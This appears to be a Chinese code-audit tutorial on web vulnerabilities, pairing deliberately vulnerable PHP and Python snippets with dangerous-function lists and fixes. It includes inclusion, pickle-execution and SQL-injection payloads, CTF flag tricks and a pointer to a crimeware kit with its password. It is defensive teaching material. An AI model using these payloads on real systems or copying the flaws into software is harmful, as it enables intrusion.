Java一般的web工程中都会用到web.xml，web.xml主要用来配置，可以方便的开发web工程。web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml文件。 经过个人测试，WEB工程加载顺序与元素节点在文件中的配置顺序无关。即不会因为 filter 写在 listener 的前面而会先加载 filter。WEB容器的加载顺序是：ServletContext -&gt; context-param -&gt; listener -&gt; filter -&gt; servlet。并且这些元素可以配置在文件中的任意位置。 加载过程顺序如下： 启动一个WEB项目的时候，WEB容器会去读取它的配置文件web.xml，读取listener&gt;和&lt;context-param&gt;两个结点。 紧急着，容创建一个ServletContext（servlet上下文），这个web项目的所有部分都将共享这个上下文。 容器将&lt;context-param&gt;转换为键值对，并交给servletContext。 容器创建&lt;listener&gt;中的类实例，创建监听器。 &lt;context-param&gt;上下文参数12345&lt;context-param&gt; &lt;param-name&gt;ContextParameter&lt;/para-name&gt; &lt;param-value&gt;test&lt;/param-value&gt; &lt;description&gt;It is a test parameter.&lt;/description&gt;&lt;/context-param&gt; &lt;filter&gt;过滤器将一个名字与一个实现javaxs.servlet.Filter接口的类相关联。 123456789101112&lt;filter&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;filter-class&gt;com.myTest.setCharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; &lt;listener&gt;监听器123&lt;listener&gt; &lt;listerner-class&gt;com.listener.SessionListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;servlet&gt; &lt;servlet&gt;&lt;/servlet&gt; 用来声明一个servlet的数据，主要有以下子元素： &lt;servlet-name&gt;&lt;/servlet-name&gt; 指定servlet的名称 &lt;servlet-class&gt;&lt;/servlet-class&gt; 指定servlet的类名称 &lt;jsp-file&gt;&lt;/jsp-file&gt; 指定web站台中的某个JSP网页的完整路径 &lt;init-param&gt;&lt;/init-param&gt; 用来定义参数，可有多个init-param。在servlet类中通过getInitParamenter(String name)方法访问初始化参数 &lt;load-on-startup&gt;&lt;/load-on-startup&gt;指定当Web应用启动时，装载Servlet的次序。当值为正数或零时：Servlet容器先加载数值小的servlet，再依次加载其他数值大的servlet 当值为负或未定义：Servlet容器将在Web客户首次访问这个servlet时加载它。 &lt;servlet-mapping&gt;&lt;/servlet-mapping&gt; 用来定义servlet所对应的URL，包含两个子元素 &lt;servlet-name&gt;&lt;/servlet-name&gt; 指定servlet的名称 &lt;url-pattern&gt;&lt;/url-pattern&gt; 指定servlet所对应的URL 1234567891011121314151617181920212223242526&lt;!-- 基本配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;!-- 高级配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;foo&lt;/param-name&gt; &lt;param-value&gt;bar&lt;/param-value&gt; &lt;/init-param&gt; &lt;run-as&gt; &lt;description&gt;Security role for anonymous access&lt;/description&gt; &lt;role-name&gt;tomcat&lt;/role-name&gt; &lt;/run-as&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 设置jsp&lt;jsp-config&gt; 包括 &lt;taglib&gt; 和 &lt;jsp-property-group&gt; 两个子元素。其中&lt;taglib&gt;元素在JSP 1.2 时就已经存在；而` 是JSP 2.0 新增的元素。 `元素主要有八个子元素，它们分别为： &lt;description&gt;：设定的说明 &lt;display-name&gt;：设定名称 &lt;url-pattern&gt;：设定值所影响的范围，如： /CH2 或 /*.jsp &lt;el-ignored&gt;：若为 true，表示不支持 EL 语法 &lt;scripting-invalid&gt;：若为 true，表示不支持 &lt;% scripting %&gt;语法 &lt;page-encoding&gt;：设定 JSP 网页的编码 &lt;include-prelude&gt;：设置 JSP 网页的抬头，扩展名为 .jspf &lt;include-coda&gt;：设置 JSP 网页的结尾，扩展名为 .jspf 12345678910111213141516&lt;jsp-config&gt; &lt;taglib&gt; &lt;taglib-uri&gt;Taglib&lt;/taglib-uri&gt; &lt;taglib-location&gt;/WEB-INF/tlds/MyTaglib.tld&lt;/taglib-location&gt; &lt;/taglib&gt; &lt;jsp-property-group&gt; &lt;description&gt;Special property group for JSP Configuration JSP example.&lt;/description&gt; &lt;display-name&gt;JSPConfiguration&lt;/display-name&gt; &lt;url-pattern&gt;/jsp/* &lt;/url-pattern&gt; &lt;el-ignored&gt;true&lt;/el-ignored&gt; &lt;page-encoding&gt;GB2312&lt;/page-encoding&gt; &lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; &lt;include-prelude&gt;/include/prelude.jspf&lt;/include-prelude&gt; &lt;include-coda&gt;/include/coda.jspf&lt;/include-coda&gt; &lt;/jsp-property-group&gt;&lt;/jsp-config&gt; PythonPython 的Web框架我目前只接触了django，Django参照于MVC模式，但又不完全相同。它一般被称为MTV模式（Model数据存取层、Template表现层、View业务逻辑层）。它的路由一般都在urls.py中配置，框架其他情况可以去网上搜索其教程。 漏洞文件操作漏洞文件上传文件上传过程中，通常因为未校验上传文件后缀类型，或者中间件解析问题，导致用户可上传php等一些webshell文件。代码审计时可重点关注对上传文件类型是否有足够安全的校验，以及是否限制文件大小等。 应用场景：图片上传、附件上传等。 关键词/接口/类包： 1234567// JavaMultipartFile...// PHPmove_uploaded_file()getimagesize() 修复方案： 使用白名单校验上传文件类型、大小限制。 对上传文件名（包括后缀）进行重命名。 将文件统一存放至文件服务器。 文件读取关键词/接口/类包： 12345678910111213141516171819// PHPhightlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen(filename,&quot;r&quot;),filename,&quot;r&quot;),size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen(filename,&quot;r&quot;),filename,&quot;r&quot;),size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组 文件包含php支持的协议可以查阅官方手册 漏洞代码示例-1： 123456// PHP12345&lt;?phpinclude($_GET[&apos;file&apos;].&apos;.php&apos;);//?file=2.txt%00 【PHP版本小于5.3】 漏洞代码示例-2： 123456// PHP12345&lt;?phpinclude($_GET[&apos;file&apos;]);//?file=php://filter/convert.base64.encode(内容被base64编码)/resource=example.txt 关键词/接口/类包： 12345678910// PHPfopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once()allow_url_include = on 文件删除关键词/接口/类包： 123// PHPunlink()session_destroy() 目录列举关键词/接口/类包： 123456// PHPprint_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录 print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125; 代码/命令执行代码执行函数应用场景：需要自定义执行系统代码的地方。 漏洞代码实实例-1： 123// Pythonimport cPicklecPickle.loads(&quot;cos\nsystem\n(S&apos;uname -a&apos;\ntR.&quot;) 漏洞代码实实例-2： 123456789101112131415// Python@login_required@permission_required(&quot;accounts.newTask_assess&quot;)def targetLogin(request): req = simplejson.loads(request.POST[&apos;loginarray&apos;]) req=unicode(req).encode(&quot;utf-8&quot;) loginarray=eval(req) p=_e(request,&apos;ipList&apos;) #targets=base64.b64decode(targets) (iplist1,iplist2)=getIPTwoList(ip) iplist1=list(set(iplist1)) iplist2=list(set(iplist2)) loginlist=[] delobjs=[] holdobjs=[] 关键词/接口/类包： 1234567891011121314151617// Java...// PHPeval()assert()preg_replace + &apos;/e&apos;call_user_func()call_user_func_array()create_functionarray_map()...// Pythonevalpickle.loads 修复方案： 避免命令用户可控 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等 命令执行漏洞由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。 应用场景：需要执行系统命令的地方。 漏洞代码示例-1： 1234567// Pythondef myserve(request, filename, dirname): re = serve(request=request,path=filename,document_root=dirname,show_indexes=True) filestr=&apos;authExport.dat&apos; re[&apos;Content-Disposition&apos;] = &apos;attachment; filename=&quot;&apos; + urlquote(filestr) +&apos;&quot;&apos;fullname=os.path.join(dirname,filename) os.system(&apos;sudo rm -f %s&apos;%fullname) return re 关键词/接口/类包： 12345678910111213141516171819202122232425// JavaRuntime.execProcessBuilder.startGroovyShell.evaluate...// PHPsystem()passthru()exec()pcntl_exec()shell_exec()popen()proc_open()`(反单引号)ob_start()escapeshellcmd() // 该函数用于过滤....// Pythonos.systemos.popencommands.getoutputcommands.getstatusoutputsubprocess 修复方案： 避免命令用户可控 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等 序列化与反序列化在现有很多的应用当中，需要对某些对象进行序列化，让它们离开内存空间，入驻物理硬盘，以便可以长期保存，其中最常见的是Web服务器中的Session对象。对象的序列化一般有两种用途：把对象的字节序列永久地保存到硬盘上，通常存放在一个指定文件中；或者在网络上传送对象的字节序列。 而把字节序列恢复为对象的过程称为对象的反序列化。当两个进程在进行远程通信时，彼此可以发送各种类型的数据，而且无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。 当应用代码从用户接受序列化数据，并试图反序列化改数据进行下一步处理时，会产生反序列化漏洞，其中最有危害性的就是远程代码注入。 这种漏洞产生原因是，执行反序列化时，并不会对自身的输入进行检查，这就说明恶意攻击者可能也可以构建特定的输入，在反序列化之后会产生非正常结果，利用这一方法就可以实现远程执行任意代码。 在PHP中注意wakeup绕过问题。 关键词/接口/类包： 12345678910111213// JavaObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject// PHPserialize()unserialize()ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;); 修复方案： 禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。可以考虑在代码安全扫描时，加强对命令执行等相关代码的检测。也可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类或者提供设置白名单的接口 SQL注入漏洞注入攻击的本质，是程序把用户输入的数据当做的Sql代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的Sql代码中从而被执行。sql注入漏洞则是程序将用户输入数据拼接到了sql语句中，从而攻击者即可构造、改变sql语义从而进行攻击。 应用场景：数据库操作处使用动态拼接形式。 漏洞代码示例-1： 123456789101112// Pythondef getUsers(user_id=None): conn = psycopg2.connect(&quot;dbname=&apos;××&apos; user=&apos;××&apos; host=&apos;&apos; password=&apos;&apos;&quot;) cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor) if user_id==None: str = &apos;select distinct * from auth_user&apos; else: str=&apos;select distinct * from auth_user where id=%d&apos;%user_id res = cur.execute(str) res = cur.fetchall() conn.close() return res 关键词/接口/类包： 这个比较容易寻找，只要找sql查询的关键词即可。 12345selectdelectinsertupdate... 修复方案： 框架所提供的Sql安全语法 避免使用动态拼接形式 采用预编译的方式。 统一编码（UTF-8） XSS存储型XSS和反射XSS基本没什么区别，就是中间经过了数据库。 而DOM型XSS主要关于html以及js代码中有没有相关的拼接、打印操作。 应用场景：将从客户端接受的数据未经过滤直接打印到页面上。 漏洞代码实例-1： 1234// Pythondef xss_test(request): name = request.GET[&apos;name&apos;] return HttpResponse(&apos;hello %s&apos; %(name)) 修复方案： 对敏感字符进安全过滤。 XML漏洞XML注入原理与SQL注入基本相同，只是改成了xml的形式，例如： 1quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1 XXEXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源,如读取passwd文件、对外发起请求、DOS等： 应用场景：XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可留意下XML解析器是否禁用外部实体，从而判断是否存在XXE。 关键词/接口/类包： 12345678910111213141516// Javajavax.xml.parsers.DocumentBuilderjavax.xml.stream.XMLStreamReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.parsers.SAXParserorg.dom4j.io.SAXReader org.xml.sax.XMLReaderjavax.xml.transform.sax.SAXSource javax.xml.transform.TransformerFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.validation.SchemaFactoryjavax.xml.bind.Unmarshallerjavax.xml.xpath.XPathExpression... 修复方案： 使用XML解析器时需要设置其属性，禁止使用外部实体，XML解析器的安全使用可参考文章_Prevention_Cheat_Sheet ) 变量覆盖漏洞漏洞代码示例-1： 12345678910111213141516171819// PHP $$ 变量覆盖&lt;?phpshow_source(__FILE__);include &quot;flag.php&quot;;$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;BugsBunnyCTF is here :p…&quot;);if ( !isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;die($_200);?&gt; 由于2个foreach的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将 $flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。 漏洞代码示例-2： 123456789101112131415161718// PHP $$ parse_str()&lt;?phperror_reporting(0);if (empty($_GET[&apos;id&apos;])) &#123; show_source(__FILE__); die();&#125; else &#123; include (&apos;flag.php&apos;); $a = &quot;This is a test.&quot;; $id = $_GET[&apos;id&apos;]; @parse_str($id); if ($a[0] != &apos;QNKCDZO&apos; &amp;&amp; md5($a[0]) == md5(&apos;QNKCDZO&apos;)) &#123; echo $flag; &#125; else &#123; exit(&apos;Error!&apos;); &#125;&#125;?&gt; parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 php弱语言特性，0e123会被当做科学计数法 使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得打flag。 关键词/接口/类包： 123456// PHPextract()import_request_variables()parse_str()mb_parse_str()全局变量覆盖：register_globals为ON，$GLOBALS 逻辑漏洞水平/垂直越权越权漏洞可以分为水平、垂直越权两种,程序在处理用户请求时未对用户的权限进行校验，使的用户可访问、操作其他相同角色用户的数据，这种情况是水平越权；如果低权限用户可访问、操作高权限用户则的数据，这种情况为垂直越权。 应用场景：查看文章、修改密码等等。 修复方案：获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。 批量请求业务中经常会有使用到发送短信校验码、短信通知、邮件通知等一些功能，这类请求如果不做任何限制，恶意攻击者可能进行批量恶意请求轰炸，大量短信、邮件等通知对正常用户造成困扰，同时也是对公司的资源造成损耗。 除了短信、邮件轰炸等，还有一种情况也需要注意，程序中可能存在很多接口，用来查询账号是否存在、账号名与手机或邮箱、姓名等的匹配关系，这类请求如不做限制也会被恶意用户批量利用，从而获取用户数据关系相关数据。对这类请求在代码审计时可关注是否有对请求做鉴权、和限制即可大致判断是否存在风险。 应用场景：短信校验码、短信通知、邮件通知等。 修复方案：在服务端对同一个用户发起这类请求的频率、每小时及每天发送量在服务端做限制。 支付漏洞应用场景：支付场景。 重复发包利用时间差： 漏洞代码示例-1： 12345678// PHP&lt;?PHPif(check_money($price))&#123; ... // 数据库取出数据 // 花费几秒 $money = $money - $price ... // 数据库存入数据&#125; 修复方案：完善逻辑。 其他逻辑漏洞这里就要根据业务功能具体问题具体分析了，可以参考下各行业漏洞点。 找回密码 token http://foreversong.cn/archives/899 SSRFSSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。 应用场景：程序中发起HTTP请求操作一般在获取远程图片、页面分享收藏等业务场景,在代码审计时可重点关注一些HTTP请求操作函数。 关键词/接口/类包： 123456// JavaHttpClient.executeHttpClient.executeMethodHttpURLConnection.connectHttpURLConnection.getInputStreamURL.openStream 修复方案： 使用白名单校验HTTP请求url地址 避免将请求响应及错误信息返回给用户 禁用不需要的协议及限制请求端口,仅仅允许http和https请求等 AutobindingAutobinding-自动绑定漏洞，根据不同语言/框架，该漏洞有几个不同的叫法，如下： Mass Assignment: Ruby on Rails, NodeJS Autobinding: Spring MVC, ASP.NET MVC Object injection: PHP(对象注入、反序列化漏洞) 软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。这里攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。 具体参考 URL重定向由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。 应用场景：登录接口等 关键词/接口/类包： 1234// JavasendRedirectsetHeaderforward 修复方案： 使用白名单校验重定向的url地址 给用户展示安全风险提示，并由用户再次确认是否跳转 CSRF跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。 由于开发人员对CSRF的了解不足，错把”经过认证的浏览器发起的请求”当成”经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就”被”执行了相应的操作。 此类漏洞一般都会在框架中解决修复，所以在审计csrf漏洞时。首先要熟悉框架对CSRF的防护方案，一般审计时可查看增删改请求重是否有token、formtoken等关键字以及是否有对请求的Referer有进行校验。手动测试时,如果有token等关键则替换token值为自定义值并重放请求，如果没有则替换请求Referer头为自定义链接或置空。重放请求看是否可以成功返回数据从而判断是否存在CSRF漏洞。 应用场景：编辑文章，修改密码等 修复方案： Referer校验，对HTTP请求的Referer校验，如果请求Referer的地址不在允许的列表中，则拦截请求。 Token校验，服务端生成随机token，并保存在本次会话cookie中，用户发起请求时附带token参数，服务端对该随机数进行校验。如果不正确则认为该请求为伪造请求拒绝该请求。 Formtoken校验，Formtoken校验本身也是Token校验，只是在本次表单请求有效。 对于高安全性操作则可使用验证码、短信、密码等二次校验措施 增删改请求使用POST请求 二次漏洞攻击者提交的恶意的代码不是直接通过一个变量提交漏洞函数而是通过变量转化或者中转，最终提交到漏洞函数，例如通过SQL注射漏洞转化、通过编码/解码中转变量、或者其他方式等等。 比如先将用户提交的数据储存进数据库，然后再读取数据库中的数据传入命令执行或者文件读取的函数中去，造成漏洞的产生等等。 应用场景：多样化。 修复方案：在处理逻辑上进行分析，在交给敏感函数处理之前严格校验。 第三方组件安全这个比较好理解，诸如Struts2、不安全的编辑控件、XML解析器以及可被其它漏洞利用的如commons-collections:3.1等第三方组件，这个可以在程序pom文件中查看是否有引入依赖。即便在代码中没有应用到或很难直接利用，也不应该使用不安全的版本，一个产品的周期很长，很难保证后面不会引入可被利用的漏洞点。 修复方案：使用最新或安全版本的第三方组件。 弱类型PHP 的弱类型问题由来已久, 出现这些问题的，具体原因其实有很多，除了 intval 之类的类型转换，也有其他的。 PHP使用strcmp比较图： 12345678910&lt;?php// PHPif(in_array($_GET[&apos;id&apos;], array(1,2,3,4)))&#123; $sql = &quot;SELECT name from user Where id = &apos;&quot;.$_GET[&apos;id&apos;].&quot;&apos;&quot;; echo $sql;&#125;// in_array() : 比较之前会自动转换类型// ?id=1&apos; union select &apos;1 再比如：双等于== 和三等于=== 的问题：双等于会在变量比较时，进行类转换，与in_array() 是一样的问题。三等于是type和value的双重比较，相比之下更加安全。 其他最后还有其他临时想到的安全问题： 对不可信的字符串进行正则匹配造成的DOS. 代码中的敏感信息（数据库密码、密钥）直接以硬编码的形式写进代码、配置文件中。 日志拼接时将用户可控的字符直接输出。 异常处理不好导致信息泄露。 …… 练习对于代码审计的入门，可先实践一遍Damn Vulnerable Web App（DVWA）和Sibria Exploit Kit的漏洞发掘与利用。 DVWA是基于PHP并汇总了各类漏洞的一套测试环境，在其中能够看到Web应用中许多常见的错误。Siberia Exploit Kit是一个被许多犯罪份子用来完成大量攻击的”犯罪套件”，它包括了一个浏览器利用包和一个用来管理受害主机的控制面板。Siberia包含的几种基于POST的身份认证漏洞允许攻击者获得管理员权限并接管服务器所在的主机。 OWASP Broken Web Apps Siberia Crimeware Pack口令: infected 之后便可去网上寻找下载CMS等进行进一步的学习。 案例这里附一个大佬们挖出的漏洞phpcms v9.6.1任意文件读取漏洞 在phpcms中，有一个file_down函数用来下载文件的，该函数位于/phpcms/libs/functions/global.func.php: 123456789101112131415161718function file_down($filepath, $filename = '') &#123; if(!$filename) $filename = basename($filepath); if(is_ie()) $filename = rawurlencode($filename); $filetype = fileext($filename); $filesize = sprintf("%u", filesize($filepath)); if(ob_get_length() !== false) @ob_end_clean(); header('Pragma: public'); header('Last-Modified: '.gmdate('D, d M Y H:i:s') . ' GMT'); header('Cache-Control: no-store, no-cache, must-revalidate'); header('Cache-Control: pre-check=0, post-check=0, max-age=0'); header('Content-Transfer-Encoding: binary'); header('Content-Encoding: none'); header('Content-type: '.$filetype); header('Content-Disposition: attachment; filename="'.$filename.'"'); header('Content-length: '.$filesize); readfile($filepath); exit;&#125; 而调用他的地方是： 该函数就是一个正常的文件下载的函数，而调用这个函数的地方位于phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123class down &#123; // ...... public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); $a_k = safe_replace($a_k); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $id = intval($id); $modelid = intval($modelid); $catid = intval($catid); $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); $siteids = getcache('category_content','commons'); $siteid = $siteids[$catid]; $CATEGORYS = getcache('category_content_'.$siteid,'commons'); $this-&gt;category = $CATEGORYS[$catid]; $this-&gt;category_setting = string2array($this-&gt;category['setting']); //检查文章会员组权限 $groupids_view = ''; if ($rs['groupids_view']) $groupids_view = explode(',', $rs['groupids_view']); if($groupids_view &amp;&amp; is_array($groupids_view)) &#123; $_groupid = param::get_cookie('_groupid'); $_groupid = intval($_groupid); if(!$_groupid) &#123; $forward = urlencode(get_url()); showmessage(L('login_website'),APP_PATH.'index.php?m=member&amp;c=index&amp;a=login&amp;forward='.$forward); &#125; if(!in_array($_groupid,$groupids_view)) showmessage(L('no_priv')); &#125; else &#123; //根据栏目访问权限判断权限 $_priv_data = $this-&gt;_category_priv($catid); if($_priv_data=='-1') &#123; $forward = urlencode(get_url()); showmessage(L('login_website'),APP_PATH.'index.php?m=member&amp;c=index&amp;a=login&amp;forward='.$forward); &#125; elseif($_priv_data=='-2') &#123; showmessage(L('no_priv')); &#125; &#125; //阅读收费 类型 $paytype = $rs['paytype']; $readpoint = $rs['readpoint']; if($readpoint || $this-&gt;category_setting['defaultchargepoint']) &#123; if(!$readpoint) &#123; $readpoint = $this-&gt;category_setting['defaultchargepoint']; $paytype = $this-&gt;category_setting['paytype']; &#125; //检查是否支付过 $allow_visitor = self::_check_payment($catid.'_'.$id,$paytype,$catid); if(!$allow_visitor) &#123; $http_referer = urlencode(get_url()); $allow_visitor = sys_auth($catid.'_'.$id.'|'.$readpoint.'|'.$paytype).'&amp;http_referer='.$http_referer; &#125; else &#123; $allow_visitor = 1; &#125; &#125; if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error')); if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) &#123; $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down'); $a_k = urlencode(sys_auth("i=$i&amp;d=$d&amp;s=$s&amp;t=".SYS_TIME."&amp;ip=".ip()."&amp;m=".$m."&amp;f=$f&amp;modelid=".$modelid, 'ENCODE', $pc_auth_key)); $downurl = '?m=content&amp;c=down&amp;a=download&amp;a_k='.$a_k; &#125; else &#123; $downurl = $f; &#125; include template('content','download'); &#125; public function download() &#123; $a_k = trim($_GET['a_k']); $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down'); $a_k = sys_auth($a_k, 'DECODE', $pc_auth_key); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f,$t,$ip); $a_k = safe_replace($a_k); parse_str($a_k); if(isset($i)) $downid = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); if(!$i || $m&lt;0) showmessage(L('illegal_parameters')); if(!isset($t)) showmessage(L('illegal_parameters')); if(!isset($ip)) showmessage(L('illegal_parameters')); $starttime = intval($t); if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error')); $fileurl = trim($f); if(!$downid || empty($fileurl) || !preg_match("/[0-9]&#123;10&#125;/", $starttime) || !preg_match("/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/", $ip) || $ip != ip()) showmessage(L('illegal_parameters')); $endtime = SYS_TIME - $starttime; if($endtime &gt; 3600) showmessage(L('url_invalid')); if($m) $fileurl = trim($s).trim($fileurl); if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error')); //远程文件 if(strpos($fileurl, ':/') &amp;&amp; (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) &#123; header("Location: $fileurl"); &#125; else &#123; if($d == 0) &#123; header("Location: ".$fileurl); &#125; else &#123; $fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl); $filename = basename($fileurl); //处理中文文件 if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) &#123; $filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl)); $filename = urldecode(basename($filename)); &#125; $ext = fileext($filename); $filename = date('Ymd_his').random(3).'.'.$ext; $fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl); file_down($fileurl, $filename); &#125; &#125; &#125; // ...... /phpcms/libs/functions/global.func.php函数 12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('"','&amp;quot;',$string); $string = str_replace("'",'',$string); $string = str_replace('"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = 